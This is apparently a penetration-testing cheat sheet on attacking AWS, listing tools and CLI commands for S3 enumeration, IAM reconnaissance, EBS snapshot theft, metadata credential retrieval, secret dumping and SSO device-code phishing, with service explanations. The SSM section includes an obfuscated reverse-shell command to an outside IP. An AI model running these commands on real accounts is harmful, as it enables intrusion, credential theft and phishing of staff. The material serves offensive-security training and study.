# Cloud

## Tools

- [GrayHatWarfare](buckets.grayhatwarfare.com/buckets)
- [Cloud_enum](https://github.com/initstring/cloud_enum)
- [BucketFinder](https://digi.ninja/projects/bucket_finder.php)
- [TruffleHog](https://github.com/trufflesecurity/truffleHog)
- [AWS_Scripts](https://github.com/cloudbreach/CloudBreach_AWSScripts)
- [Pacu - AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)
- [dsnap - download EBS snapshots](https://github.com/RhinoSecurityLabs/dsnap)
- [AWS sso device code authentication](https://github.com/christophetd/aws-sso-device-code-authentication)
- [Enumerate IAM](https://github.com/andresriancho/enumerate-iam)


## AWS

### Services

- S3 - Simple Storage Service
- EC2 - Elastic Compute Cloud
- EBS - Elastic Block Store (used with EC2 for persistent, durable storage volumes)
- SSM - AWS Systems Manager
- IAM - Identity and Access Management
- SNS - Amazon Simple Notification Service 
- Lambda - serverless computing service
- DynamoDB - NoSQL database
- ECR - Elastic Container Registry
- ECS - Elastic Container Service
- EKS - Elastic Kubernetes Service
- KMS - Key Management Service
- RDS - Relational Database Service

### Tips

Define different profile in `~/.aws/credentials` and use them with `aws --profile <name>`

```
[profile_1]
aws_access_key_id=ASIAI44QH8DHBEXAMPLE
aws_secret_access_key=je7MtGbClwBF/2Zp9Utk/h3yCo8nvbEXAMPLEKEY
aws_session_token = fcZib3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZ2luX2IQoJb3JpZVERYLONGSTRINGEXAMPLE
```

### Unauthenticated Enumeration

**OSINT**

```
<Target_Company> “AWS_ACCESS_KEY_ID” OR “AWS_ACCESS_SECRET_KEY”

<Target_Company> “AWS_ACCESS_KEY_ID” OR “AWS_ACCESS_SECRET_KEY” filetype:txt

site:http://amazonaws.com inurl:".s3.amazonaws.com/" "<Target_Company>”

site:.s3.amazonaws.com "Company" “<Target_Company>”

Intitle:index.of.bucket “<Target_Company>”
```
[GrayHatWarfare](buckets.grayhatwarfare.com/buckets)

**S3 Bucket Enumeration**

Amazon S3 (Simple Storage Service) is a scalable storage service offered by Amazon Web Services (AWS).

`http://[bucketname].s3-website-[region].amazonaws.com/`

Guess Naming Convention: Bucket Naming Conventions are often guessable.

```
aws s3 ls s3://insert-bucket-name-example
```

[Cloud_enum](https://github.com/initstring/cloud_enum)

```
./cloud_enum.py -k <company-name> --disable-azure --disable-gcp
```

[BucketFinder](https://digi.ninja/projects/bucket_finder.php)
[TruffleHog](https://github.com/trufflesecurity/truffleHog)

```
mkdir s3
cd s3
aws s3 sync s3://bucket . # This is the command where you need to have AWS credentials.
aws s3 sync s3://bucket . --no-sign-request # No sign-in required

aws s3api list-object-versions --bucket bucket --no-sign-request # List bucket versions
```

Check AWS s3 dumper in that case !


**AWS Subdomain Takeover**

An AWS subdomain takeover is a misconfiguration occurs when a subdomain is still pointing to an AWS service that has been deleted or is otherwise no longer properly in use by the rightful owner. Subdomains are typically created for various AWS services like S3, EC2, or CloudFront.

Here’s a breakdown of how it happens and the potential abuse by attackers:

Setup: A company sets up a subdomain (e.g., blog.company.com) and points it to an AWS S3 bucket using a DNS CNAME record to serve content over HTTP.

Abandonment: The company stops using the S3 bucket for any reason—maybe they moved their service or no longer need the subdomain—and they delete the S3 bucket. However, they neglect to remove or update the DNS CNAME record that points to that bucket.

Takeover: An attacker notices that blog.company.com is still pointing to the now non-existent S3 bucket. This can be done through DNS enumeration or by using tools like Sublist3r, AWS-specific tools like AWSBucketDump, or other reconnaissance techniques. Since AWS S3 bucket names are unique across all users, the attacker can create a new S3 bucket with the same name that the subdomain’s DNS record is pointing to.

Control: Once the attacker has created a new S3 bucket with the corresponding name, they gain control over the content that the subdomain delivers. This is because the DNS record still directs traffic to the bucket that is now under the attacker’s control.

Abuse: The attacker can then use this to serve malicious content, create phishing pages, or even attempt to capture sensitive information from unsuspecting users who visit the subdomain thinking it’s a legitimate part of the company’s website. If the company’s cookies were not secured, it might also lead to session hijacking and account takeovers


### Authenticated Reconnaissance

**Configure**

```
aws configure # Use AccessKey and SecretAccessKey
```

**IAM permissions**

```
aws sts get-caller-identity # Retrieve Account ID
aws iam get-user --user-name <breached_username> # Return information about the user
aws iam list-user-policies –user-name <breached_username> # Return a list of policies
aws iam list-attached-user-policies --user-name <breached_username> # Return in-line policies
aws iam get-user-policy --user-name <breached_username> --policy-name <policyname> # Return specific in-line policy
aws iam list-users # list users in IAM
aws iam create-access-key --user-name <user-name> # Create access key for the specified user
```

[Pacu - AWS exploitation framework](https://github.com/RhinoSecurityLabs/pacu)

**EC2 instances**

```
aws ec2 describe-instances # decribe EC2 instances
aws ec2 describe-volumes # list EBS volumes
aws ec2 describe-snapshots # describe EBS snapshots
```

Also, keep in mind that these commands will return JSON outputs by default. If you have a specific attribute you’re interested in, you can make use of the –query parameter to filter the output.

**Elastic Block Store (EBS)**

Amazon Elastic Block Store (EBS) is a block storage service designed to be used with Amazon Elastic Compute Cloud (EC2) instances for both throughput and transaction-intensive workloads at any scale. Offered by Amazon Web Services (AWS), EBS provides scalable, durable, high-performance storage that can be attached to running EC2 instances and used like a traditional hard drive.
EBS volumes behave like raw, unformatted block devices that can be attached to a single EC2 instance. You can create an EBS volume independently and then attach it to an EC2 instance or create an EBS volume as part of the EC2 instance launch.
The data stored on an EBS volume persists independently of the life of the associated EC2 instance, unlike instance store volumes that are ephemeral.

```
aws ec2 describe-volumes # list EBS volumes
aws ec2 describe-snapshots # describe EBS snapshots
aws ec2 describe-snapshots --region <region> 
aws ec2 describe-snapshots --region <region> --owner-ids <account-id> # List only snapshots available for account-id
pacu > run ebs__enum_volumes_snapshots --accounts-ids <account-id> # List only snapshots available for account-id
dsnap --region <region> list # List only snapshots available for current aws account
dsnap --region <region> get <snap-id> # download snapshots
```

To mount a retrieved snapshot, docker can be used:

```
cd <dsnap_pwd>
sudo IMAGE=snapshot.img make docker/run
```

### Enumeration & Command Execution via SSM

AWS Systems Manager (SSM) is a comprehensive management service offered by Amazon Web Services (AWS) that simplifies the process of managing and automating tasks on AWS resources. It provides a centralised platform for configuring, managing, and maintaining servers and applications in your AWS environment.

SSM operates by installing an agent on EC2 instances, which allows administrators to remotely execute commands, automate tasks, and manage configuration settings on those instances. It provides a secure and efficient way to perform various operational tasks, such as software patching, inventory management, and software installation.

However, in the hands of a potential attacker, SSM could be abused for malicious purposes. If an attacker gains unauthorised access to an AWS environment or compromises an EC2 instance, they may use SSM to execute arbitrary commands or scripts, manipulate configurations, and potentially compromise the security and integrity of the environment. To mitigate this risk, it’s crucial to implement robust security practices, including proper IAM (Identity and Access Management) policies, auditing, and monitoring to prevent unauthorised access and misuse of AWS SSM.

```
run iam__enum_permissions --user-name <username> # Enumerate user permissions

aws iam list-attached-user-policies --user-name <username> # Get policies attached to a user
aws iam get-policy --policy-arn arn:<policy_arn> # Get more information about a policy
aws iam get-policy-version --policy-arn arn:<policy_arn> --version-id v1 # Get version information about a policy
aws ec2 describe-instances --filter Name=tag:Name,Values=<name> 
aws ec2 describe-instances --filter Name=instance-id,Values=<instance-id>
```

**Command execution via SSM**
```
aws ssm send-command \
    --instance-ids "instance-ID" \
    --document-name "AWS-RunShellScript" \
    --comment "IP config" \
    --parameters commands=ifconfig \
    --output text

aws ssm send-command 
    --instance-ids "instance-ID" \
    --document-name "AWS-RunShellScript" \
    --comment "ReverseShell" 
    --parameters '{"commands":["echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEwLjEyLzg0NDMgMD4mMQo= | base64 -d | bash"]}'
#   --parameters '{"commands":["bash -i >& /dev/tcp/10.0.10.12/8443 0>&1"]}' 
    --output text   

# Get result
aws ssm list-command-invocations \
    --command-id $sh-command-id \
    --details
```

By default, when users log in using the AWS Command Line Interface (CLI), a hidden directory named `.aws` is automatically created in their home directory for several important reasons. This directory serves as a crucial configuration hub for the AWS CLI, enabling users to store and manage their AWS access credentials, region preferences, and other configuration settings.

```
cat ~/.aws/config
cat ~/.aws/credentials
```

### Abuse IAM User Roles, Instance Metadata & SNS

Amazon Web Services Identity and Access Management (AWS IAM) is a service that governs access to AWS resources, ensuring secure and fine-grained control over permissions. IAM operates by defining policies that specify what actions are allowed or denied on AWS resources.

Users, groups, and roles are key IAM entities. Users represent individual identities, while groups allow for collective permission assignment. Roles are used for cross-account or service-level access. IAM also supports multi-factor authentication (MFA) for added security and provides access keys for programmatic access.

**Instance Metadata Service (IMDS)**

AWS IMDSv1 (Instance Metadata Service Version 1) and IMDSv2 (Instance Metadata Service Version 2) are services provided by Amazon Web Services (AWS) that allow EC2 instances to retrieve metadata about themselves and interact with the instance’s local configuration. While both services serve similar purposes, they have significant differences in terms of security and functionality.

**AWS Secrets Manager**

AWS Secrets Manager is a managed service provided by Amazon Web Services (AWS) that simplifies the secure storage and management of sensitive information such as API keys, passwords, and other credentials. It operates by allowing users to create and store secrets, which are essentially pieces of sensitive data, in a centralized and highly secure manner.

Here’s how AWS Secrets Manager works:

Secret Creation: Users can create secrets using the AWS Management Console, SDKs, or the AWS Command Line Interface (CLI). These secrets can include database credentials, API keys, or any other sensitive data.
Encryption: AWS Secrets Manager encrypts these secrets both at rest and in transit using industry-standard encryption protocols, ensuring the confidentiality and integrity of the stored data.
Access Control: Users can define fine-grained access control policies to specify who can access and manage secrets, helping to maintain the principle of least privilege.
Rotation: One of the standout features of AWS Secrets Manager is its ability to automate the rotation of credentials. It can periodically generate new credentials for a secret and update the applications that use them, thus enhancing security by regularly changing access credentials.
Integration: AWS Secrets Manager can seamlessly integrate with AWS services and other applications, allowing for secure retrieval of secrets during application runtime. This eliminates the need for hard coding credentials within applications.
Overall, AWS Secrets Manager simplifies the management of sensitive information, enhances security through automated rotation, and promotes best practices for handling credentials in a cloud-native environment.

```
aws secretsmanager list-secrets # list secrets
aws secretsmanager get-secret-value --secret-id <secret-id>
```

**AWS AssumeRole**

AWS AssumeRole is an essential feature of Amazon Web Services (AWS) Identity and Access Management (IAM), enabling entities like IAM users or AWS services to temporarily acquire the permissions and access rights of another AWS entity by assuming a specific role. This delegation is defined through a trust policy, which specifies the trusted entities that can assume the role.

Here’s how it works:

    An entity requests to assume a role by calling the AssumeRole API operation or assumes the role via the AWS Management Console.
    AWS validates the entity’s permissions against the trust policy attached to the role. The trust policy specifies who can assume the role, typically within the same or different AWS accounts.
    Once authorized, AWS generates temporary security credentials for the entity, granting access based on the permissions defined in the role’s policies.
    The entity can now perform actions and access resources using the temporary credentials, limited to the permissions of the assumed role.

**AWS Inline Policy**

In Amazon Web Services (AWS), inline policies are IAM (Identity and Access Management) policies that you can create and manage embedded directly to a single user, group, or role. Inline policies are used to grant permissions to a specific AWS service or resource and are not standalone like managed policies. Additional information can be found in AWS Access and Identity documentation.

Always aim for the principle of least privilege when crafting policies. This means only granting the permissions that are absolutely necessary for the task at hand. Misconfigured inline policies can accidentally grant broader access than intended.

#### Abusing Instance Metadata Service (IMDS)

- Metadata exposes static information about the EC2 instance itself, such as instance ID, IAM role name, security groups, network interfaces, and region. This data describes what the instance is and how it’s configured.
- Dynamic data provides information that can change over time, mainly related to the instance’s temporary state, such as spot instance actions or scheduled maintenance events.
- User data is arbitrary data supplied by the instance creator at launch time and is commonly used for bootstrap scripts, configuration files, or—critically—hardcoded secrets, API keys, or credentials in poorly designed setups.

If IMDSv1 is enabled, it is possible to retrieve metadata 

```
curl http://169.254.169.254/latest/meta-data/ # instance's metadata
curl http://169.254.169.254/latest/meta-data/hostname # instance's hostname
curl http://169.254.169.254/latest/meta-data/ami-id # instance's AMI ID
curl http://169.254.169.254/latest/meta-data/instance-type # instance's type
curl http://169.254.169.254/latest/meta-data/security-groups # instance security groups
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name> # instance's IAM role creds (if a role is attached to the instance)

curl http://169.254.169.254/latest/user-data
```

The IP address 169.254.169.254 is a special link-local address used by AWS for EC2 instances to access their metadata without requiring external connectivity.


```
aws iam list-user-policies --user-name <username> # List user's policies
aws iam get-user-policy --user-name <username> --policy-name <policy-name> # User's policy description
aws iam get-policy --policy-arn arn:<policy_arn> # Get more information about a policy

aws ec2 describe-instance-attribute --instance-id <instance-id> --attribute <attribute-name> # Read attribute from ec2 instance
```

To loop over a long list of EC2 instance to find an attribute :

```
for i in $(aws ec2 describe-instances --query 'Reservations[].Instances[].InstanceId' --output text); do echo $i && aws ec2 describe-instance-attribute --instance-id $i --attribute <attribute-name> ;done
```

### Capture Credentials from SNS Service

**Amazon Simple Notification Service (AWS SNS)**

Amazon Simple Notification Service (AWS SNS) is a fully managed messaging service offered by Amazon Web Services (AWS). It enables the distribution of messages and notifications across a variety of platforms and endpoints, including email, SMS, HTTP/HTTPS, and more. AWS SNS uses a publish-subscribe model, where publishers send messages to topics, and subscribers receive those messages based on their interest in specific topics.

A Topic ARN (Amazon Resource Name) is a unique identifier for an SNS topic within AWS. It’s used to address and target specific topics when publishing messages. Topic ARNs are essential for routing messages to the appropriate subscribers and play a key role in the access control policies that define who can publish and subscribe to specific topics.

However, if an attacker gains unauthorised access to a topic ARN and possesses the necessary permissions, they could potentially abuse it in several ways:

Unauthorised Message Publication: An attacker could publish unauthorised messages to a topic, potentially disseminating false information, spam, or malicious content to subscribers.

Denial of Service: By flooding a topic with a high volume of messages, an attacker could overload the system and disrupt legitimate notifications, causing a denial of service (DoS) situation.

Data Exfiltration: If an attacker has publishing access to a sensitive topic, they could use it to exfiltrate confidential data to an external location.

To prevent such abuse, it’s crucial to implement strict access controls, use AWS Identity and Access Management (IAM) policies, and regularly audit and monitor your SNS topics to detect and mitigate any unauthorised activity.

```
aws sns subscribe --topic-arn <topic-arn> --protocol email --notification-endpoint <email> # Subscribe to a topic
# Subscription needs to be validated by checking your mail
```

### Get Remote Code Execution on a Lambda Function

**AWS Lambda**

AWS Lambda is a serverless computing service provided by Amazon Web Services (AWS). It enables users to run code in response to events or triggers without the need to manage servers. Lambda functions are designed to be small, single-purpose pieces of code that can scale automatically and execute in milliseconds.

However, in some scenarios, a potential attacker could abuse Lambda functions if they gain unauthorised access. 

Resource Exhaustion: Attackers might attempt to exhaust Lambda resources by triggering a high volume of requests or running long-duration functions, causing disruptions or resource exhaustion for other legitimate users.

Unauthorised Code Execution: If an attacker gains access to create or modify Lambda functions, they could execute arbitrary code, potentially leading to data breaches or malicious actions within the AWS environment.

Data Exfiltration: Attackers could abuse Lambda to exfiltrate sensitive data from an organisation by running functions that send data to external locations.

DoS Attacks: Lambda functions can be targets of Distributed Denial of Service (DDoS) attacks, with attackers attempting to overwhelm the service by invoking a large number of functions simultaneously.

To mitigate these risks, AWS users should implement strong access controls, use AWS Identity and Access Management (IAM) policies to restrict permissions, monitor Lambda function invocations, and employ best practices for securing their code and event sources. It’s crucial to follow AWS security guidelines to prevent potential abuse of Lambda functions.

```
aws lambda list-functions # list functions
aws lambda get-function --function-name <function-name> # get function
# Find URL of lambda function
aws lambda get-policy --function-name <function-name> # get information about lambda's function policy (URL)
aws apigateway get-rest-apis # Can also be used to gather information to build URL
```

Lambda URL format : `https://[NAME].execute-api.[REGION].amazonaws.com`

Look in the lambda ARN and replace NAME and REGION !

Once RCE in lambda, check `env` to retrieve AWS keys

### Enumerate and Read Data from DynamoDB

**Amazon DynamoDB**

Amazon DynamoDB is a fully managed NoSQL database service offered by Amazon Web Services (AWS). It is designed for high-performance, low-latency, and scalable storage of structured data. DynamoDB provides features like automatic scaling, fault tolerance, and seamless replication across multiple AWS regions.

However, if security measures are not properly implemented, attackers can potentially abuse DynamoDB in various ways:

Unauthorised Data Access: Attackers might exploit misconfigured access controls to gain unauthorised access to sensitive data stored in DynamoDB tables.

Data Exfiltration: Once inside, attackers can exfiltrate valuable data or manipulate records in the database, causing data breaches or integrity issues.

Table Enumeration: Attackers may attempt to enumerate existing DynamoDB tables to gather information about the database structure and potential targets.

Injection Attacks: If input validation is weak, attackers can attempt injection attacks, such as NoSQL injection, to exploit vulnerabilities and execute malicious queries.

To safeguard against these threats, AWS users should implement strong access controls, use AWS Identity and Access Management (IAM) policies, regularly audit and monitor DynamoDB access, and apply encryption and best practices to secure their data and database configurations.

```
aws dynamodb list-tables # list tables
aws dynamodb scan --table-name <table-name> # select * from tables
```

### Upload Malicious Image into ECR

**Amazon Elastic Container Registry (ECR)**

Amazon Elastic Container Registry (ECR) is a fully managed Docker container registry service provided by Amazon Web Services (AWS). It allows users to store, manage, and deploy container images, making it easier to build, store, and deploy containerized applications using popular tools like Docker.

Here’s how AWS ECR works:

Image Repository: Users can create repositories in ECR to store Docker images. Each repository can hold multiple image versions, making it a centralised hub for container images.

Image Push and Pull: Developers can push (upload) their Docker images to ECR, while deployment environments can pull (download) the images for running containerized applications.

Integration with ECS and EKS: ECR seamlessly integrates with Amazon Elastic Container Service (ECS) and Amazon Elastic Kubernetes Service (EKS), simplifying container deployment and orchestration.

However, if attackers gain unauthorised access to an ECR repository, they could potentially abuse it:

Image Manipulation: Attackers could modify container images, injecting malware, vulnerabilities, or malicious code into images used for deployments.

Data Exfiltration: If the repository contains sensitive data, attackers might exfiltrate it or gain unauthorised access to confidential information.

To secure ECR, AWS users should implement robust access controls, restrict permissions to trusted entities, and regularly audit and monitor repository activity to detect and prevent unauthorised access or abuse.

The Importance of Docker Image Tags in Containerized Environments

Docker image tags are crucial for several reasons in containerized environments:

Versioning and Tracking: Image tags allow you to version your container images. Each tag represents a specific version of the image, making it easy to track changes, updates, and rollbacks. This versioning helps maintain consistency in deployments and facilitates debugging and troubleshooting.

Reproducibility: Tags ensure that you can reliably recreate previous states of your application by specifying the exact image version. This is essential for consistent and predictable deployments, especially in continuous integration and continuous deployment (CI/CD) pipelines.

Rolling Updates: When deploying applications at scale, having distinct image versions with different tags is critical. It allows you to perform rolling updates, where you gradually update instances to the latest image while maintaining older versions for redundancy and fallback.

Testing and Development: Tags are invaluable during the development and testing phases. Developers can work with specific image versions, ensuring that they test against the same environment that will be deployed in production.

Security and Patching: Image tags enable you to quickly identify and update vulnerable or outdated images. By maintaining a clear tagging strategy, you can swiftly address security issues by rolling out patched versions.

```
aws ecr describe-repositories # list repositories
aws ecr describe-images --repository-name <repository-name> # list images from a repository


# Login to AWS ECR (rights permissions needed)
aws ecr get-login-password --region us-east-1 | sudo docker login --username AWS --password-stdin <registry-id>.dkr.ecr.us-east-1.amazonaws.com
# And then push the image
sudo docker push <registry-id>.dkr.ecr.us-east-1.amazonaws.com/<repository-id>:latest

```

When an attacker successfully compromises a Kubernetes environment, their initial command often involves running “env” to inspect environment variables. This is a common first step because, unfortunately, some DevOps practices involve storing sensitive information like cleartext keys directly as environment variables instead of securely managing them in a secret manager.

By running “env” command, attackers can quickly access these sensitive credentials, potentially gaining unauthorised access to critical systems, databases, or cloud resources. It highlights the critical importance of adhering to security best practices, such as using Kubernetes Secrets or a dedicated secret management service, to safeguard sensitive information and prevent potential breaches in Kubernetes environments.

### AWS SSO Phishing Attack

**AWS IAM Identity Center**

AWS IAM Identity Center offers a secure solution for the central management of workforce identities, allowing you to establish or link user identities seamlessly across AWS accounts and applications. It serves as the recommended method for implementing workforce authentication and authorization within AWS, catering to organisations of diverse sizes and types. With IAM Identity Center, you gain the ability to efficiently create and oversee user identities within the AWS ecosystem. You can also integrate your existing identity sources, including but not limited to Microsoft Active Directory, Okta, Ping Identity, JumpCloud, Google Workspace, and Microsoft Entra ID (Entra ID).

Some use-cases are:

Enable multi-account access to your AWS accounts: IAM Identity Center simplifies multi-account access management by allowing your users to employ their directory credentials for seamless single sign-on access to various AWS accounts. Through their personalised web user portal, users can conveniently view and access their assigned roles across multiple AWS accounts from one centralised location. This streamlined authentication experience extends to AWS CLI, SDKs, and the AWS Console Mobile Application, ensuring a uniform and secure authentication process.

Enable single sign-on access to your AWS Apps: IAM Identity Center offers integrated access to AWS applications such as Amazon SageMaker Studio, AWS Systems Manager Change Manager, and AWS IoT SiteWise, enabling zero-configuration authentication and authorization. These applications seamlessly interact with IAM Identity Center to provide a unified view of users and groups, enhancing resource sharing and collaboration within the application environment. This integration ensures an efficient and consistent user experience for accessing AWS applications.

From the previous lab, we gathered valuable information from EKS by executing the ‘env’ command. The value of ‘AWS_SSO’ is of utmost importance as it allows us to determine the URL of the AWS IAM Identity Center. By default, access to the AWS portal can be obtained via a URL following this format: `d-xxxxxxxxxx.awsapps.com/start`

It’s essential to note that, without this URL, the ability to send phishing emails is impeded. 

Fortunately, since most organisations customise this Identity by replacing it with their company name, we have the option to either brute force it or guess it.
AWS SSO – Device Code Phishing Attack

An AWS SSO device code phishing attack is a specific type of cyberattack targeting the device code flow used in the AWS Single Sign-On (SSO) authentication process. AWS SSO allows users to sign in once and access multiple AWS accounts and applications. The device code flow is a method used for authentication on devices with limited input capabilities, such as smart TVs or gaming consoles.

In this attack, an attacker tries to trick a user into entering their device code on a malicious website or app controlled by the attacker. Once the attacker obtains the device code, they can use it to complete the authentication process and gain unauthorised access to the user’s AWS resources.

- AWS SSO OIDC - IAM Identity Center OpenID Connect (OIDC) is a web service that enables a client (such as CLI or a native application) to register with IAM Identity Center

[Generate link for phishing attack](https://github.com/christophetd/aws-sso-device-code-authentication)

```
# Generate device-code link for phishing
python3 main.py -u https://<AWS_SSO>.awsapps.com/start/ -r <region>


```

### Enumerate AWS IAM Identity Center Permissions

Enumerate AWS SSO Portal

```
# Enumerate SSO 
aws sso-admin list-instances # list instances
aws sso-admin list-permission-sets --instance <instance-arn> # list permission sets
aws sso-admin describe-permission-set --instance <instance-arn> --permission-set-arn <permission-set-arn> # describe a permission set
```


### Enumerate AWS IAM Permission & Retrieve Secrets from Secret Manager

**AWS Secrets Manager**

AWS Secrets Manager is a service offered by Amazon Web Services that helps users securely manage, store, and retrieve secrets. Secrets can include passwords, API keys, tokens, and other sensitive data that applications, services, or IT resources need to access. The primary goal of AWS Secrets Manager is to safeguard access to services and applications by eliminating the need to hard-code sensitive information in plaintext, thereby enhancing security and compliance.

Key features of AWS Secrets Manager include:

- Secret Rotation: It supports the automatic rotation of secrets without requiring updates to your applications, thus ensuring credentials are regularly updated for enhanced security.
- Centralized Management: It provides a centralized place to manage all your secrets, making it easier to organize, access, control them across your AWS environment.
- Secure Storage: Secrets are encrypted using encryption keys that you control through AWS Key Management Service (KMS).
- Access Control: Integration with AWS Identity and Access Management (IAM) allows you to control who can manage or access ysecrets.
- Audit and Monitoring: Integration with AWS CloudTrail provides a record of calls to AWS Secrets Manager for compliance and auditpurposes.
- Cross-Region Replication: It allows you to replicate secrets across multiple AWS regions for disaster recovery purposes.

AWS Secrets Manager is designed to be highly available and durable, storing your secrets across multiple Availability Zones. It is particularly useful for managing credentials necessary for accessing databases, third-party APIs, and other services securely, without embedding them directly in code.

To query AWS Secrets Manager and retrieve a secret, you can use the AWS Management Console, AWS CLI (Command Line Interface), AWS SDKs (Software Development Kits) for various programming languages, or directly via the AWS Secrets Manager REST API. Below are examples of how to retrieve a secret using the AWS CLI and AWS SDK for Python (Boto3).


```
aws secretsmanager list-secrets # list secrets
aws secretsmanager get-secret-value --secret-id <secret-id> # get secret value
aws secretsmanager get-secret-value --secret-id <secret-id> --version-id <version-id> # get secret value
```

### Utilising Rancher to Gain Shell Access to a Pod

**What is Rancher and What are the Benefits of Using It**

Rancher is a powerful and popular open-source container management platform that simplifies the deployment, orchestration, and management of containerized applications and Kubernetes clusters. It provides a comprehensive suite of tools and features that streamline the containerization journey for organisations, making it easier to harness the full potential of container technology. 

Some key aspects and benefits of using Rancher:

Centralised Management: Rancher offers a unified, web-based interface that allows users to manage and monitor multiple Kubernetes clusters across different environments from a single, centralised dashboard. This simplifies the management of complex container infrastructures, whether they are on-premises, in the cloud, or at the edge.

Kubernetes Made Accessible: Rancher abstracts much of the complexity of Kubernetes, making it accessible to a wider range of users, from DevOps teams to developers. It provides an intuitive user experience for cluster provisioning, scaling, and lifecycle management, reducing the learning curve associated with Kubernetes.

Multi-Cluster Management: Organisations often operate multiple Kubernetes clusters for various purposes, such as development, testing, and production. Rancher excels at managing multiple clusters, making it easy to ensure consistency, security, and compliance across these clusters. It simplifies the process of creating, upgrading, and patching clusters.

Extensibility: Rancher’s open architecture allows users to easily integrate additional tools and services. It supports a wide range of third-party plugins and extensions, making it adaptable to various infrastructure and application requirements. This extensibility enhances Rancher’s capabilities, such as networking, storage, and security.

Security and Compliance: Rancher offers robust security features, including role-based access control (RBAC), identity and access management (IAM), and security scanning for container images. These capabilities help organisations enforce security policies and ensure compliance with industry standards and regulations.

### Amazon Elastic Kubernetes Service (AWS EKS)

Amazon Elastic Kubernetes Service (AWS EKS) is a managed Kubernetes service provided by Amazon Web Services (AWS) that simplifies the deployment, management, and scaling of containerized applications using Kubernetes. Here’s an overview of AWS EKS, its components, and common misconfigurations that attackers may exploit:

**AWS EKS Overview**

AWS EKS abstracts the complexities of Kubernetes cluster management and offers a reliable and scalable platform for running containerized workloads. Key components include:

EKS Cluster: The EKS cluster is the central management entity that hosts multiple worker nodes and manages their orchestration. It’s responsible for maintaining the desired state of your Kubernetes applications.

Worker Nodes: Worker nodes are EC2 instances within your EKS cluster that run containerized applications. These nodes are managed by the EKS control plane.

Pods: Pods are the smallest deployable units in Kubernetes, representing a single instance of a running process. Containers within a pod share the same network namespace, making them suitable for tightly coupled applications.

Service: Kubernetes services provide a stable endpoint for accessing a set of pods. Services allow for load balancing and automatic DNS resolution, making applications accessible within the cluster or externally.

Namespace: Namespace is a logical, virtual cluster within a physical Kubernetes cluster. Namespaces provide a way to segregate and isolate resources and objects within a cluster, creating distinct scopes for applications and services.

**Kubernetes Common Misconfigurations**

Some common misconfigurations in Kubernetes in general that can be exploited by attackers, along with the corresponding technical attack vectors:

Inadequate Pod Security Policies (PSPs):

Attack Vector: Attackers may exploit pods running with overly permissive security contexts to perform privilege escalation or container breakout attacks. For example, they may run containers with hostPath volumes to access sensitive host files.

Exposed ConfigMaps:

Attack Vector: Misconfigured ConfigMaps with sensitive data can expose credentials or configuration details. Attackers may exploit this to access secrets, manipulate application settings, or gain unauthorised access.

Insecure Network Policies:

Attack Vector: Weak or misconfigured Network Policies can allow attackers to move laterally within the cluster or exfiltrate data between pods. They may exploit this to perform reconnaissance or exfiltrate sensitive information.

Unprotected etcd:

Attack Vector: Inadequate protection of the etcd database, which stores Kubernetes configuration data, can lead to unauthorized access or data manipulation. Attackers may attempt to exploit etcd vulnerabilities to gain control over the cluster.

Exposed kubelet API:

Attack Vector: Misconfigured kubelet settings or exposed kubelet API endpoints can allow attackers to gain control over worker nodes. They may use this access to run rogue containers, compromise the node, or perform denial-of-service attacks.

Insecure Secrets Management:

Attack Vector: Storing secrets in plaintext or misconfigured Kubernetes Secrets can expose sensitive data. Attackers may exploit this to access credentials or API keys, leading to data breaches or unauthorised access.

Open Service Endpoints:

Attack Vector: Exposing services to the public internet without proper authentication can allow attackers to abuse these services or initiate Distributed Denial of Service (DDoS) attacks.

Weak Authentication and Authorization:

Attack Vector: Failing to enforce strong authentication and authorization mechanisms can lead to brute force attacks or unauthorised access. Attackers may attempt to guess or crack weak credentials to gain control over the cluster.

Unpatched Software Components:

Attack Vector: Neglecting to apply security patches and updates to Kubernetes, EKS, or worker nodes can leave known vulnerabilities unaddressed. Attackers may exploit these vulnerabilities to compromise the cluster.

### Relational Database Service (AWS RDS)

Amazon Web Services Relational Database Service (AWS RDS) is a managed database service that simplifies the setup, operation, and scaling of relational databases in the cloud. RDS supports various database engines, including MySQL, PostgreSQL, Oracle, SQL Server, and MariaDB, offering organisations a range of options to meet their specific database needs.

Here’s how AWS RDS works:

Deployment: Users can easily launch a relational database instance in RDS. AWS manages the provisioning of hardware, database setup, patching, and backups, reducing administrative overhead.

Database Engines: RDS supports multiple database engines, allowing users to choose the one that best suits their application requirements.

Scaling: RDS provides options for vertical and horizontal scaling to accommodate growing workloads. Users can resize instances or create read replicas for improved performance and availability.

Automated Backups: RDS automated database backups, making it simple to recover data in case of failures or user errors. Users can also set up automated snapshots for data retention.

Security: RDS offers robust security features, including network isolation, encryption at rest and in transit, and integration with AWS Identity and Access Management (IAM) for fine-grained access control.

Monitoring and Metrics: AWS CloudWatch integration allows users to monitor database performance and set up alarms for proactive issue resolution.

High Availability: RDS supports Multi-AZ deployments for failover and read replicas for improved availability and fault tolerance.

AWS RDS simplifies database management, ensuring that organisations can focus on their applications while AWS takes care of the database infrastructure, backups, and maintenance. It’s a valuable service for those looking to run relational databases in the cloud with ease and reliability.

A potential attacker can find publicly exposed Amazon RDS (Relational Database Service) instances through various means, and once they locate them, there are significant cybersecurity risks associated with these exposed instances:

1. Port Scanning: Attackers often use port scanning tools to scan IP addresses for open ports associated with databases like MySQL, PostgreSQL, or Oracle. When they find an open port (typically port 3306 for MySQL), they may attempt to connect and probe for vulnerabilities.

2. Shodan and Other Search Engines: Shodan is a specialised search engine that scans the internet for open ports and services. Attackers can use Shodan and similar search engines to find publicly exposed RDS instances by searching for specific keywords or services.

3. DNS Enumeration: If the DNS name of the RDS instance is known or can be guessed, attackers can directly connect to it using the DNS name.

4. Misconfigured Security Groups: In some cases, RDS instances may be exposed due to misconfigured security groups or network access control lists (NACLs) that allow unauthorised access from the internet.